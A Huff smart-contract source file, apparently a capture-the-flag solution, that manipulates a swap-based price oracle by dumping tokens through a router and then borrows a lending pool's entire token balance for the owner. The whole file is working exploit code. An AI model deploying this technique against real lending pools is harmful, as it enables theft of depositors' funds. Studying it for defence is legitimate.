// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant TOKEN_SLOT = FREE_STORAGE_POINTER()
#define constant ROUTER_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_SLOT = FREE_STORAGE_POINTER()
#define constant WETH_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x80            // [0x80, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x80, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (1st arg)
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address

    0x20            // [0x20] - size code we will copy (address)
    0x60            // [0x60, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x60, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (2nd arg)
    msize           // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address
    // [OFFSET 0x20]  0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address

    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (3rd arg)
    msize           // [0x40, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address
    // [OFFSET 0x20]  0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [OFFSET 0x40]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from (4th arg)
    msize           // [0x60, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address
    // [OFFSET 0x20]  0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [OFFSET 0x40]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [OFFSET 0x60]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> weth address

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [token] - copied token onto stack from byte offset 0x00 in mem
    [TOKEN_SLOT]    // [0x01, token] - storage slot where to store token
    sstore          // [] - copied token to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address

    0x20            // [0x20] - byte offset in memory
    mload           // [router] - copied router onto stack from byte offset 0x20 in mem
    [ROUTER_SLOT]   // [0x02, router] - storage slot where to store router 
    sstore          // [] - copied router to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address
    // [SLOT 0x02] 0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address

    0x40            // [0x40] - byte offset in memory
    mload           // [pool] - copied pool onto stack from byte offset 0x40 in mem
    [POOL_SLOT]     // [0x03, pool] - storage slot where to store pool
    sstore          // [] - copied router to storage slot 0x03

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address
    // [SLOT 0x02] 0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [SLOT 0x03] 000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address

    0x60            // [0x60] - byte offset in memory
    mload           // [weth] - copied weth onto stack from byte offset 0x60 in mem
    [WETH_SLOT]     // [0x04, weth] - storage slot where to storeweth 
    sstore          // [] - copied router to storage slot 0x04

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> token address
    // [SLOT 0x02] 0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [SLOT 0x03] 000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [SLOT 0x04] 000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> weth address

}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy `approve(address,uint256)` &`balanceOf(address)` func sigs into mem to use as calldata for CALLs
    // We will call `balanceOf` first and also set up params for `approve(address,uint256)` at the same time
    0x095ea7b3        // [0x095ea7b3] - func sig for `approve(address,uint256)`
    0x00              // [0x00, 0x095ea7b3] - byte offset in mem
    mstore            // [] - copied func sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` function sig

    [ROUTER_SLOT]     // [0x02] - storage slot where router is
    sload             // [router] - copied router onto stack from storage slot 0x02
    dup1              // [router, router] - duplicate router for future CALL
    msize             // [0x20, router, router] - active mem
    mstore            // [router] - copied router into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address

    0x70a08231        // [0x70a08231, router] - func sig for `balanceOf`
    0x80              // [0x80, 0x70a08231, router] - byte offset in mem
    mstore            // [router] - copied func sig into mem at offset 0x80

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig

    address           // [self, router]
    0xa0              // [0xa0, self, router] - byte offset in mem
    mstore            // [router] - copied self into mem at byte offset 0xa0

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)

    // STATICCALL into token
    [TOKEN_SLOT]     // [0x01, router] - storage slot where token is
    sload            // [token, router] - copied token onto stack from storage slot 0x01
    0x20             // [0x20, token, router] - size of return data (uint256)
    0x40             // [0x40, 0x20, token, router] - byte offset in mem where return data is copied
    0x24             // [0x24, 0x40, 0x20, token, router] - size of calldata
    0x9c             // [0x9c, 0x24, 0x40, 0x20, token, router] - byte offset in mem where calldata starts
    dup5             // [token, 0x9c, 0x24, 0x40, 0x20, token, router] - calling token
    gas              // [gas, token, 0x9c, 0x24, 0x40, 0x20, token, router] - gas to send with staticcall (gasleft())
    staticcall       // [success, token, router]
    iszero           // [0/1, token, router]
    throw_error      // [throw_error, 0/1, token, router]
    jumpi            // [token, router]

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   0000000000000000000000004B3E65104805A303c274f078127D5a7E9F9b47b2 -> router address
    // [OFFSET 0x40]   00000000000000000000000000000000000000000000021e19e0c9bab2400000 -> return data => initial balance (uint256)
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)

    // CALL into token
    0x00             // [0x00, token, router] - size of return data
    dup1             // [0x00, 0x00, token, router] - byte offset in mem where return data is copied
    0x44             // [0x44, 0x00, 0x00, token, router] - size of calldata
    0x1c             // [0x1c, 0x44, 0x00, 0x00, token, router] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x1c, 0x44, 0x00, 0x00, token, router] - msg.value to send with call
    dup6             // [token, 0x00, 0x1c, 0x44, 0x00, 0x00, token, router] - calling token
    gas              // [gas, token, 0x00, 0x1c, 0x44, 0x00, 0x00, token, router] - gas to send with call (gasleft())
    call             // [success, token, router]
    iszero           // [0/1, token, router]
    throw_error      // [throw_error, 0/1, token, router]
    jumpi            // [token, router]

    // Copy `swapExactTokensForETH` func sig and params into mem to use as calldata for CALL
    // the third param is a dynamic array so we need to build out the calldata for a dynamic type
    0x18cbafe5       // [0x18cbafe5, token, router] - func sig
    0x20             // [0x20, 0x18cbafe5, token, router] - byte offset in mem
    mstore           // [token, router] - copied func sig into mem at offset 0x20

    0xa0             // [0xa0, token, router] - address[] param offset
    0x80             // [0x80, 0xa0, token, router] - byte offset in mem
    mstore           // [token, router] - copied 0xa0 (160 bytes) into mem at offset 0x80

    0x02             // [0x02, token, router] - num to multiply timestamp by to calc deadline
    dup1             // [0x02, 0x02, token, router] - duplicated 0x02 to use for address[] length
    timestamp        // [timestamp, 0x02, 0x02, token, router] 
    mul              // [deadline, 0x02, token, router]
    0xc0             // [0xc0, deadline, 0x02, token, router] - byte offset in mem
    mstore           // [0x02, token, router] - copied deadline into mem at offset 0xc0

    0xe0             // [0xe0, 0x02, token, router] - byte offset in mem
    mstore           // [token, router] - copied 0x02 into mem at offset 0xe0

    dup1             // [token, token, router]
    0x100            // [0x100, token, token, router] - byte offset in mem
    mstore           // [token, router] - copied token into mem at offset 0x100

    [WETH_SLOT]      // [0x04, token, router] - storage slot where weth is
    sload            // [weth, token, router] - copied weth onto stack from storage slot 0x04
    dup1             // [weth, weth, token, router] - duplicated weth for future CALLs
    0x120            // [0x120, weth, weth, token, router]  - byte offset in mem
    mstore           // [weth, token, router] - copied weth into mem at offset 0x120

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3-> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000018cbafe5 -> `swapExactTokensForETH` function sig
    // [OFFSET 0x40]   00000000000000000000000000000000000000000000021e19e0c9bab2400000 -> return data => initial balance (uint256)
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000000000000000000000a0 -> address[] param offset
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)
    // [OFFSET 0xc0]   00000000000000000000000000000000000000000000000000000000c7dbedd2 -> deadline (uint256)
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000002 -> address[] param length
    // [OFFSET 0x100]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> address[] param 1st value (token)
    // [OFFSET 0x120]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> address[] param 2nd value (weth)

    // CALL into router
    0x00             // [0x00, weth, token, router] - size of return data
    dup1             // [0x00, 0x00, weth, token, router] - byte offset in mem where return data is copied
    0x104            // [0x104, 0x00, 0x00, weth, token, router] - size of calldata
    0x3c             // [0x3c, 0x104, 0x00, 0x00, weth, token, router] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x3c, 0x104, 0x00, 0x00, weth, token, router] - msg.value to send with call
    dup8             // [router, 0x00, 0x3c, 0x104, 0x00, 0x00, weth, token, router] - calling router
    gas              // [gas, router, 0x00, 0x3c, 0x104, 0x00, 0x00, weth, token, router] - gas to send with call
    call             // [success, weth, token, router]
    iszero           // [0/1, weth, token, router]
    throw_error      // [throw_error, 0/1, weth, token, router]
    jumpi            // [weth, token, router]

    // Copy `balanceOf(address)` and pool into mem to use as calldata for STATICCALL 
    0x70a08231       // [0x70a08231, weth, token, router] - func sig
    0x00             // [0x00, 0x70a08231, weth, token, router] - byte offset in mem
    mstore           // [weth, token, router] - copied func sig into mem at offset 0x00

    [POOL_SLOT]      // [0x03, weth, token, router] - storage slot where pool is
    sload            // [pool, weth, token, router] - copied pool onto stack from storage slot 0x03
    dup1             // [pool, pool, weth, token, router] - duplicated pool for future calls
    0x20             // [0x20, pool, weth, token, router] - byte offset in mem
    mstore           // [pool, weth, token, router] - copied pool into mem at offset 0x20

    // STATICCALL into token
    0x20             // [0x20, pool, weth, token, router] - size of return data (uint256)
    0x80             // [0x80, 0x20, pool, weth, token, router] - byte offset in mem where return data is copied
    0x24             // [0x24, 0x80, 0x20, pool, weth, token, router] - size of calldata
    0x1c             // [0x1c, 0x24, 0x80, 0x20, pool, weth, token, router] - byte offset in mem where calldata starts
    dup7             // [token, 0x1c, 0x24, 0x80, 0x20, pool, weth, token, router] - calling token
    gas              // [gas, token, 0x1c, 0x24, 0x80, 0x20, pool, weth, token, router] - gas to send with staticcall (gasleft())
    staticcall       // [success, pool, weth, token, router]
    iszero           // [0/1, pool, weth, token, router]
    throw_error      // [throw_error, 0/1, pool, weth, token, router]
    jumpi            // [pool, weth, token, router]


    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` function sig
    // [OFFSET 0x20]   000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [OFFSET 0x40]   00000000000000000000000000000000000000000000021e19e0c9bab2400000 -> return data => initial balance (uint256)
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data => pool balance (uint256)
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)
    // [OFFSET 0xc0]   00000000000000000000000000000000000000000000000000000000c7dbedd2 -> deadline (uint256)
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000002 -> address[] param length
    // [OFFSET 0x100]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> address[] param 1st value (token)
    // [OFFSET 0x120]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> address[] param 2nd value (weth)

    // Copy `calculateDepositOfWETHRequired` func sig into mem to use as calldata for STATICCALL
    0xc4bd83fa       // [0xc4bd83fa, pool, weth, token, router] - func sig
    0x60             // [0xc4bd83fa, pool, weth, token, router] - byte offset in mem
    mstore           // [pool, weth, token, router] - copied func sig into mem at offset 0x60

    // STATICCALL into pool
    0x20             // [0x20, pool, weth, token, router] - size of return data (uint256)
    0x40             // [0x40, 0x20, pool, weth, token, router] - byte offset in mem where return data is copied
    0x24             // [0x24, 0x40, 0x20, pool, weth, token, router] - size of calldata
    0x7c             // [0x7c, 0x24, 0x40, 0x20, pool, weth, token, router] - byte offset in mem where calldata starts
    dup5             // [pool, 0x7c, 0x24, 0x40, 0x20, pool, weth, token, router] - calling pool
    gas              // [gas, pool, 0x7c, 0x24, 0x40, 0x20, pool, weth, token, router] - gas to send with staticcall (gasleft())
    staticcall       // [success, pool, weth, token, router]
    iszero           // [0/1, pool, weth, token, router]
    throw_error      // [throw_error, 0/1, pool, weth, token, router]
    jumpi            // [pool, weth, token, router]

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` function sig
    // [OFFSET 0x20]   000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [OFFSET 0x40]   000000000000000000000000000000000000000000000001995899c58bdf0efc -> return data => required_eth (uint256)
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000000000000000c4bd83fa -> `calculateDepositOfWETHRequired(uint256)` func sig
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data => pool balance (uint256)
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)
    // [OFFSET 0xc0]   00000000000000000000000000000000000000000000000000000000c7dbedd2 -> deadline (uint256)
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000002 -> address[] param length
    // [OFFSET 0x100]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> address[] param 1st value (token)
    // [OFFSET 0x120]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> address[] param 2nd value (weth)

    // Copy `approvve(address,uint256)` into mem to use as calldata for CALL
    0x095ea7b3        // [0x095ea7b3, pool, weth, token, router] - func sig
    0x00              // [0x00, 0x095ea7b3, weth, pool, token, router] - byte offset in mem
    mstore            // [pool, weth, token, router] - copied func sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3 -> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [OFFSET 0x40]   000000000000000000000000000000000000000000000001995899c58bdf0efc -> return data => required_eth (uint256)
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000000000000000c4bd83fa -> `calculateDepositOfWETHRequired(uint256)` func sig
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data => pool balance (uint256)
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)
    // [OFFSET 0xc0]   00000000000000000000000000000000000000000000000000000000c7dbedd2 -> deadline (uint256)
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000002 -> address[] param length
    // [OFFSET 0x100]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> address[] param 1st value (token)
    // [OFFSET 0x120]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> address[] param 2nd value (weth)

    // CALL into weth
    0x00              // [0x00, pool, weth, token, router] - size of return data
    dup1              // [0x00, 0x00, pool, weth, token, router] - byte offset in mem where return data is copied
    0x44              // [0x44, 0x00, 0x00, pool, weth, token, router] - size of calldata
    0x1c              // [0x1c, 0x44, 0x00, 0x00, pool, weth, token, router] - byte offset in mem where calldata starts
    dup3              // [0x00, 0x1c, 0x44, 0x00, 0x00, pool, weth, token, router] - msg.value to send with call
    dup7              // [weth, 0x00, 0x1c, 0x44, 0x00, 0x00, pool, weth, token, router] - calling weth
    gas               // [gas, weth, 0x00, 0x1c, 0x44, 0x00, 0x00, pool, weth, token, router] - gas to send with call
    call              // [success, pool, weth, token, router]
    iszero            // [0/1, pool, weth, token, router]
    throw_error       // [throw_error, 0/1, pool, weth, token, router]
    jumpi             // [pool, weth, token, router]

    // CALl into weth (wrap ETH via fallback function)
    0x00              // [0x00, pool, weth, token, router] - size of return data
    dup1              // [0x00, 0x00, pool, weth, token, router] - byte offset in mem where return data is copied
    dup1              // [0x00, 0x00, 0x00, pool, weth, token, router] - size of calldata
    dup1              // [0x00, 0x00, 0x00, 0x00, pool, weth, token, router] - byte offset in mem where calldata starts
    0x40              // [0x40, 0x00, 0x00, 0x00, 0x00, pool, weth, token, router] - byte offset in mem
    mload             // [required_eth, 0x00, 0x00, 0x00, 0x00, pool, weth, token, router] - msg.value to send with call
    dup7              // [weth, required_eth, 0x00, 0x00, 0x00, 0x00, pool, weth, token, router] - calling weth
    gas               // [gas, weth, required_eth, ,0x00, 0x00, 0x00, 0x00, pool, weth, token, router] - gas to send with call
    call              // [success, pool, weth, token, router]
    iszero            // [0/1, pool, weth, token, router]
    throw_error       // [throw_error, 0/1, pool, weth, token, router]
    jumpi             // [pool, weth, token, router]

    // Copy `borrow(uint256)` func sig into mem to use as calldata for CALL
    0xc5ebeaec        // [0xc5ebeaec, pool, weth, token, router] - func sig
    0x60              // [0x60, 0xc5ebeaec, pool, weth, token, router] - byte offset in mem
    mstore            // [pool, weth, token, router] - copied func sig into mem at offset 0x60

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3 -> `approvve(address,uint256)` function sig
    // [OFFSET 0x20]   000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [OFFSET 0x40]   000000000000000000000000000000000000000000000001995899c58bdf0efc -> return data => required_eth (uint256)
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000000000000000c5ebeaec -> `borrow(uint256)` func sig
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data => pool balance (uint256)
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)
    // [OFFSET 0xc0]   00000000000000000000000000000000000000000000000000000000c7dbedd2 -> deadline (uint256)
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000002 -> address[] param length
    // [OFFSET 0x100]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> address[] param 1st value (token)
    // [OFFSET 0x120]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> address[] param 2nd value (weth)

    // CALL into pool
    0x00              // [0x00, pool, weth, token, router] - size of return data
    dup1              // [0x00, 0x00, pool, weth, token, router] - byte offset in mem where return data is copied
    0x24              // [0x24, 0x00, 0x00, pool, weth, token, router] - size of calldata
    0x7c              // [0x7c, 0x24, 0x00, 0x00, pool, weth, token, router] - byte offset in mem where calldata starts
    dup3              // [0x00, 0x7c, 0x24, 0x00, 0x00, pool, weth, token, router] - msg.value to send with call
    dup6              // [pool, 0x00, 0x7c, 0x24, 0x00, 0x00, pool, weth, token, router] - calling pool
    gas               // [gas, pool 0x00, ,0x7c, 0x24, 0x00, 0x00, pool, weth, token, router] - gas to send with call
    call              // [success, pool, weth, token, router]
    iszero            // [0/1, pool, weth, token, router]
    throw_error       // [throw_error, 0/1, pool, weth, token, router]
    jumpi             // [pool, weth, token, router]
    pop               // [weth, token, router]
    pop               // [token, router]

    // Send tokens and remaining eth to owner
    // Copy `transfer(address,uint256)` func sig into mem to use as calldata for STATICCALL
    0xa9059cbb        // [0xa9059cbb, token, router] - func sig
    0x40              // [0x40, 0xa9059cbb, token, router] - byte offset in mem
    mstore            // [token, router] - copied func sig into mem at offset 0x80

    caller            // [owner, token, router] - msg.sender is owner due to modifier
    0x60              // [0x60, owner, token, router] - byte offset in mem
    mstore            // [token, router] - copied owner into mem at offset 0x60

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000095ea7b3 -> `approve(address,uint256)` function sig
    // [OFFSET 0x20]   000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> pool address
    // [OFFSET 0x40]   00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x60]   000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x80]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data => pool balance (uint256)
    // [OFFSET 0xa0]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self (address)
    // [OFFSET 0xc0]   00000000000000000000000000000000000000000000000000000000c7dbedd2 -> deadline (uint256)
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000002 -> address[] param length
    // [OFFSET 0x100]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> address[] param 1st value (token)
    // [OFFSET 0x120]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> address[] param 2nd value (weth)

    // CALL into token
    0x00              // [0x00, token, router] - size of return data
    dup1              // [0x00, 0x00, token, router] - byte offset in mem where return data is copied
    0x44              // [0x44, 0x00, 0x00, token, router] - size of calldata
    0x5c              // [0x5c, 0x44, 0x00, 0x00, token, router] - byte offset in mem where calldata starts
    dup3              // [0x00, 0x5c, 0x44, 0x00, 0x00, token, router] - msg.value to send with call
    dup6              // [token, 0x00, 0x5c, 0x44, 0x00, 0x00, token, router] - calling token
    gas               // [gas, token, 0x00, 0x5c, 0x44, 0x00, 0x00, token, router] - gas to send with call
    call              // [success, token router]
    iszero            // [0/1, token, router]
    throw_error       // [throw_error, 0/1, tok, router]
    jumpi             // [token, router]
    pop               // [router]
    pop               // []

    // CALL owner (send remaning eth)
    0x00              // [0x00]
    dup1              // [0x00, 0x00]
    dup1              // [0x00, 0x00, 0x00]
    dup1              // [0x00, 0x00, 0x00, 0x00]
    selfbalance       // [self_bal, 0x00, 0x00, 0x00, 0x00]
    caller            // [owner, self_bal, 0x00, 0x00, 0x00, 0x00]
    gas               // [gas, owner, self_bal, 0x00, 0x00, 0x00, 0x00]
    call              // [success]
    iszero            // [0/1]
    throw_error       // [throw_error, 0/1]
    jumpi             // []

}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    // Fallback
    callvalue    // [msg.value]
    iszero       // [0/1]
    throw_error  // [throw_error, 0/1]
    jumpi        // [] - will revert if msg.value is 0, else will return
    0x00         // [0x00] - size of return data
    0x00         // [0x00, 0x00] - byte offset in mem where return data starts
    return       // [] - return wit no data
    
    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()
}
